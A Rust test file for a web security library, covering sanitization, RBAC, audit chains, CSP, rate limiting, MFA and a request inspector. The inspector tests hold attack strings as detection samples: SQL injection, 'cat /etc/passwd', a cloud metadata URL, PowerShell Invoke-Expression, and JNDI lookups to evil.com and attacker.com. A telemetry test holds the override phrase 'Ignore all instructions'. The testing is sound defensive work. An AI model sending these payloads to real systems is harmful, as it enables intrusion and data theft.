use axum::{
    Router,
    body::Body,
    extract::{Extension, Path, State},
    http::{Request, StatusCode},
    routing::get,
};
use rullst_security::{
    audit::{AuditChain, StdoutAuditLogger},
    honey::HoneypotState,
    rbac::{RbacGuard, UserContext},
    sanitizer::{HtmlSanitizer, csp::generate_nonce},
};
use std::collections::HashMap;
use std::sync::Arc;
use tower::ServiceExt;

#[tokio::test]
async fn test_honeypot_trap_detection() {
    let state = HoneypotState::default();

    assert!(state.is_trap("/.env"));
    assert!(state.is_trap("/admin.php"));
    assert!(!state.is_trap("/api/users"));

    assert!(!state.is_banned("192.168.1.100"));
    state.ban_ip("192.168.1.100".to_string());
    assert!(state.is_banned("192.168.1.100"));
    assert_eq!(state.banned_count(), 1);
}

#[test]
fn test_html_sanitizer_xss_prevention() {
    let dirty = "<script>alert('XSS')</script><b>Safe Text</b>";
    let clean = HtmlSanitizer::sanitize(dirty);
    assert!(!clean.contains("<script>"));
    assert!(clean.contains("<b>Safe Text</b>"));

    let escaped = HtmlSanitizer::sanitize_text("Hello <World> & \"Friends\"");
    assert_eq!(escaped, "Hello &lt;World&gt; &amp; &quot;Friends&quot;");
}

#[test]
fn test_csp_nonce_generation() {
    let nonce1 = generate_nonce();
    let nonce2 = generate_nonce();

    assert_eq!(nonce1.len(), 24); // 16 bytes base64 encoded
    assert_ne!(nonce1, nonce2);
}

#[test]
fn test_rbac_guard_authorization() {
    let user = UserContext::new("user_123", vec!["editor".to_string()]);
    let admin = UserContext::new("admin_999", vec!["admin".to_string()]);

    assert!(RbacGuard::authorize(&editor_or_admin(&user), "editor").is_ok());
    assert!(RbacGuard::authorize(&user, "admin").is_err());
    assert!(RbacGuard::authorize(&admin, "editor").is_ok());

    assert!(RbacGuard::authorize_owner_or_role(&user, "user_123", "admin").is_ok());
    assert!(RbacGuard::authorize_owner_or_role(&user, "user_456", "admin").is_err());
}

fn editor_or_admin(ctx: &UserContext) -> UserContext {
    ctx.clone()
}

async fn show_owned_document(
    Path(document_id): Path<String>,
    State(owners): State<Arc<HashMap<String, String>>>,
    context: Option<Extension<UserContext>>,
) -> StatusCode {
    let Some(Extension(context)) = context else {
        return StatusCode::UNAUTHORIZED;
    };
    let Some(owner_id) = owners.get(&document_id) else {
        return StatusCode::NOT_FOUND;
    };

    match RbacGuard::authorize_owner_or_role(&context, owner_id, "moderator") {
        Ok(()) => StatusCode::OK,
        Err(_) => StatusCode::FORBIDDEN,
    }
}

fn document_request(path: &str, context: Option<UserContext>) -> Request<Body> {
    let mut request = Request::builder()
        .uri(path)
        .body(Body::empty())
        .expect("valid document request");
    if let Some(context) = context {
        request.extensions_mut().insert(context);
    }
    request
}

#[tokio::test]
// TM-TENANT-02: object IDs cannot cross the authenticated ownership boundary.
async fn parameterized_route_denies_cross_owner_access_before_the_handler_succeeds() {
    let owners = Arc::new(HashMap::from([(
        "document-7".to_string(),
        "owner-1".to_string(),
    )]));
    let router = Router::new()
        .route("/documents/{document_id}", get(show_owned_document))
        .with_state(owners);

    let owner = UserContext::new("owner-1", vec!["member".to_string()]);
    let unrelated = UserContext::new("user-2", vec!["member".to_string()]);
    let moderator = UserContext::new("moderator-3", vec!["moderator".to_string()]);

    let owner_response = router
        .clone()
        .oneshot(document_request("/documents/document-7", Some(owner)))
        .await
        .expect("owner response");
    assert_eq!(owner_response.status(), StatusCode::OK);

    let unrelated_response = router
        .clone()
        .oneshot(document_request("/documents/document-7", Some(unrelated)))
        .await
        .expect("cross-owner response");
    assert_eq!(unrelated_response.status(), StatusCode::FORBIDDEN);

    let moderator_response = router
        .clone()
        .oneshot(document_request("/documents/document-7", Some(moderator)))
        .await
        .expect("moderator response");
    assert_eq!(moderator_response.status(), StatusCode::OK);

    let unauthenticated_response = router
        .oneshot(document_request("/documents/document-7", None))
        .await
        .expect("unauthenticated response");
    assert_eq!(unauthenticated_response.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_audit_chain_hmac_integrity() {
    let logger = Arc::new(StdoutAuditLogger);
    let secret = b"super-secret-hmac-key-at-least-32-bytes";
    let chain = AuditChain::try_new(secret, logger).expect("strong audit key");

    let record1 = chain
        .record_event("admin", "UPDATE", "user_123", "{\"role\":\"manager\"}")
        .await
        .unwrap();

    assert_eq!(record1.sequence_id, 1);
    assert_eq!(record1.previous_hash, "GENESIS_HASH");
    assert!(AuditChain::verify_record(secret, &record1));

    let record2 = chain
        .record_event("admin", "DELETE", "post_456", "{}")
        .await
        .unwrap();

    assert_eq!(record2.sequence_id, 2);
    assert_eq!(record2.previous_hash, record1.hash);
    assert!(AuditChain::verify_record(secret, &record2));
    assert!(AuditChain::verify_sequence(
        secret,
        &[record1.clone(), record2.clone()]
    ));
    assert!(AuditChain::verify_record(secret, &record2));
    assert!(!AuditChain::verify_sequence(
        secret,
        std::slice::from_ref(&record2)
    ));

    // Tampered record test
    let mut tampered = record2.clone();
    tampered.payload = "{\"tampered\": true}".to_string();
    assert!(!AuditChain::verify_record(secret, &tampered));

    let mut discontinuous = vec![record1, record2];
    discontinuous[1].sequence_id = 3;
    assert!(!AuditChain::verify_sequence(secret, &discontinuous));
}

#[tokio::test]
async fn test_csp_security_layer_middleware() {
    use axum::Router;
    use axum::body::Body;
    use axum::extract::Extension;
    use axum::http::{Request, StatusCode};
    use axum::routing::get;
    use rullst_security::{CspNonce, CspSecurityLayer};
    use tower::ServiceExt;

    let app = Router::new()
        .route(
            "/page",
            get(|Extension(nonce): Extension<CspNonce>| async move { nonce.to_string() }),
        )
        .layer(CspSecurityLayer)
        .layer(axum::middleware::from_fn(
            rullst_core::security::headers_middleware,
        ));

    let req = Request::builder().uri("/page").body(Body::empty()).unwrap();
    let res = app.oneshot(req).await.unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let headers = res.headers();
    assert!(headers.contains_key("content-security-policy"));
    assert_eq!(headers.get("x-frame-options").unwrap(), "DENY");
    assert_eq!(headers.get("x-content-type-options").unwrap(), "nosniff");
    assert_eq!(
        headers.get("referrer-policy").unwrap(),
        "strict-origin-when-cross-origin"
    );

    let csp = headers
        .get("content-security-policy")
        .unwrap()
        .to_str()
        .unwrap()
        .to_owned();
    assert!(csp.contains("default-src 'self'"));
    assert!(csp.contains("nonce-"));
    assert!(!csp.contains("unsafe-inline"));
    assert!(!csp.contains("unsafe-eval"));
    let body = axum::body::to_bytes(res.into_body(), 1_024).await.unwrap();
    let nonce = std::str::from_utf8(&body).unwrap();
    assert!(csp.contains(&format!("'nonce-{nonce}'")));
}

#[tokio::test]
async fn test_rasp_inspector_and_layer() {
    use axum::Router;
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use axum::response::Html;
    use axum::routing::get;
    use rullst_security::{RaspInspector, RaspSecurityLayer};
    use tower::ServiceExt;

    // Direct Inspector unit tests
    assert!(RaspInspector::inspect_text(
        "SELECT * FROM users WHERE id = 1 UNION SELECT 1,2,3"
    ));
    assert!(RaspInspector::inspect_text("' OR '1'='1"));
    assert!(RaspInspector::inspect_text("; DROP TABLE users;"));
    assert!(RaspInspector::inspect_text(
        "http://169.254.169.254/latest/meta-data/"
    ));
    assert!(RaspInspector::inspect_text("cat /etc/passwd"));
    assert!(RaspInspector::inspect_text(
        "powershell -Command Invoke-Expression"
    ));
    assert!(RaspInspector::inspect_text("${jndi:ldap://evil.com/a}"));
    assert!(!RaspInspector::inspect_text(
        "Hello John Doe! Welcome back to the application."
    ));

    let app = Router::new()
        .route("/api/query", get(|| async { Html("data") }))
        .layer(RaspSecurityLayer);

    // Malicious request blocked with 403 Forbidden via path traversal in URI
    let bad_req = Request::builder()
        .uri("/api/query?path=/etc/passwd")
        .body(Body::empty())
        .unwrap();
    let bad_res = app.clone().oneshot(bad_req).await.unwrap();
    assert_eq!(bad_res.status(), StatusCode::FORBIDDEN);

    // Malicious request blocked with 403 Forbidden via JNDI in User-Agent header
    let jndi_req = Request::builder()
        .uri("/api/query")
        .header("User-Agent", "${jndi:ldap://attacker.com/malicious}")
        .body(Body::empty())
        .unwrap();
    let jndi_res = app.clone().oneshot(jndi_req).await.unwrap();
    assert_eq!(jndi_res.status(), StatusCode::FORBIDDEN);

    // Clean request passes with 200 OK
    let good_req = Request::builder()
        .uri("/api/query?q=legit_search_term")
        .body(Body::empty())
        .unwrap();
    let good_res = app.oneshot(good_req).await.unwrap();
    assert_eq!(good_res.status(), StatusCode::OK);
}

#[test]
fn test_siem_alerting_and_cef_formatting() {
    use rullst_security::{LiveSecurityEvent, dispatch_siem_alert, format_cef_event};

    let event = LiveSecurityEvent::local(
        "AI_PROMPT_INJECTION_SHIELDED",
        "Blocked system override attempt",
        "203.0.113.195",
    );

    let cef = format_cef_event(&event);
    assert!(cef.contains(&format!(
        "CEF:0|RullstSecurity|Framework|{}|AI_PROMPT_INJECTION_SHIELDED",
        env!("CARGO_PKG_VERSION")
    )));
    assert!(cef.contains("src=203.0.113.195"));
    assert!(cef.contains("severity=9") || cef.contains("|9|"));

    dispatch_siem_alert(
        "XSS_PAYLOAD_NEUTRALIZED",
        "Stripped <script> tag",
        "198.51.100.22",
    );
    dispatch_siem_alert(
        "HONEYPOT_TRAP_TRIGGERED",
        "Probed /wp-admin",
        "198.51.100.23",
    );
}

#[test]
fn test_security_telemetry_store_all_methods() {
    use rullst_security::{SecurityStore, get_real_rss_memory_mb};

    let store = SecurityStore::global();
    store.inc_sanitizations();
    store.inc_honeypot_traps();
    store.inc_rbac_denials();
    store.inc_zero_trust_mismatches();
    store.inc_schema_violations();
    store.inc_sri_signed_assets();
    store.inc_mfa_verifications();
    store.inc_deception_hits();
    store.inc_cswsh_blocks();
    store.inc_rate_limit_blocks();
    store.inc_siem_dispatches();
    store.inc_login_jail_bans();
    store.inc_dlp_masked();
    store.inc_secure_headers();
    store.inc_idor_warnings();
    store.inc_timing_guard_protected();

    store.record_honeypot_trap("1.2.3.4", "/.env");
    store.record_sanitization("Sanitized payload");
    store.record_prompt_injection_blocked("5.6.7.8", "Ignore all instructions");
    store.record_prompt_inspected();
    store.record_pii_masked(3);
    store.record_rbac_denial("user_test", "resource_test");

    let snapshot = store.snapshot();
    assert!(snapshot.sanitizations > 0);
    assert!(snapshot.honeypot_traps > 0);

    let rss = get_real_rss_memory_mb();
    assert!(rss.is_none_or(|memory| memory >= 0.0));
}

#[tokio::test]
async fn test_rate_limit_middleware_with_axum() {
    use axum::Router;
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use axum::middleware;
    use axum::response::Html;
    use axum::routing::get;
    use rullst_security::rate_limit_middleware;
    use tower::ServiceExt;

    let app = Router::new()
        .route("/api/data", get(|| async { Html("ok") }))
        .layer(middleware::from_fn(rate_limit_middleware));

    let req = Request::builder()
        .uri("/api/data")
        .header("X-Forwarded-For", "192.0.2.1")
        .body(Body::empty())
        .unwrap();
    let mut req = req;
    req.extensions_mut().insert(axum::extract::ConnectInfo(
        "192.0.2.2:443".parse::<std::net::SocketAddr>().unwrap(),
    ));

    let res = app.oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK);
}

#[test]
fn test_mfa_totp_rfc6238_generation_and_verification() {
    use rullst_security::{
        build_otpauth_uri, decode_base32, generate_mfa_secret, generate_totp_code, verify_totp_code,
    };

    let secret = generate_mfa_secret();
    assert_eq!(secret.len(), 32);

    let decoded = decode_base32(&secret);
    assert!(decoded.is_some());

    let uri = build_otpauth_uri("RullstApp", "alice@example.com", &secret);
    assert!(uri.starts_with("otpauth://totp/RullstApp:alice%40example.com?secret="));
    assert!(uri.contains("&issuer=RullstApp"));

    let code = generate_totp_code(&secret).expect("valid code generation");
    assert_eq!(code.len(), 6);
    assert!(code.chars().all(|c| c.is_ascii_digit()));

    assert!(verify_totp_code(&secret, &code));
    let wrong_code = if code == "000000" { "000001" } else { "000000" };
    assert!(!verify_totp_code(&secret, wrong_code));
}

#[test]
fn test_zero_trust_fingerprinting() {
    use rullst_security::{generate_fingerprint, verify_fingerprint};

    let secret = b"super-secret-zero-trust-key-32bytes";
    let fp1 = generate_fingerprint(
        secret,
        Some("Mozilla/5.0"),
        Some("192.168.1.50"),
        Some("en"),
    );
    let fp2 = generate_fingerprint(
        secret,
        Some("Mozilla/5.0"),
        Some("192.168.1.50"),
        Some("en"),
    );
    let fp3 = generate_fingerprint(secret, Some("Mozilla/5.0"), Some("10.0.0.1"), Some("en"));

    assert_eq!(fp1, fp2);
    assert_ne!(fp1, fp3);
    assert!(verify_fingerprint(
        &fp1,
        secret,
        Some("Mozilla/5.0"),
        Some("192.168.1.50"),
        Some("en")
    ));
    assert!(!verify_fingerprint(
        &fp1,
        secret,
        Some("Mozilla/5.0"),
        Some("10.0.0.1"),
        Some("en")
    ));
}

#[test]
fn test_sri_hash_and_tags() {
    use rullst_security::{compute_sri_hash, sri_link_tag, sri_script_tag};

    let js_content = b"console.log('Rullst Security SRI');";
    let hash = compute_sri_hash(js_content);
    assert!(hash.starts_with("sha384-"));

    let script = sri_script_tag("/static/app.js", js_content);
    assert!(script.contains("src=\"/static/app.js\""));
    assert!(script.contains("integrity=\"sha384-"));
    assert!(script.contains("crossorigin=\"anonymous\""));

    let css_content = b"body { background: #000; }";
    let link = sri_link_tag("/static/style.css", css_content);
    assert!(link.contains("href=\"/static/style.css\""));
    assert!(link.contains("rel=\"stylesheet\""));
    assert!(link.contains("integrity=\"sha384-"));
}

#[test]
fn test_login_guard_and_jail() {
    use rullst_security::LoginGuard;

    let guard = LoginGuard::new();
    let ip = "198.51.100.99";

    assert!(!guard.is_jailed(ip));
    for _ in 0..5 {
        guard.record_login_failure(ip);
    }
    assert!(guard.is_jailed(ip));
    assert!(guard.remaining_jail_time(ip).is_some());
}

#[tokio::test]
async fn test_timing_guard_synthetic_work() {
    use rullst_security::{
        TimingGuardConfig, TimingScope, equalize_response_time, synthetic_argon2_cpu_work,
    };
    use std::time::{Duration, Instant};

    synthetic_argon2_cpu_work();

    let start = Instant::now();
    let config = TimingGuardConfig {
        min_duration: Duration::from_millis(15),
        max_jitter: Duration::from_millis(5),
        enable_synthetic_cpu_cycles: true,
    };

    let scope = TimingScope::start(config.clone());
    scope.finish().await;
    assert!(start.elapsed() >= Duration::from_millis(14));

    let result = equalize_response_time(config, || async { 42 }).await;
    assert_eq!(result, 42);
}
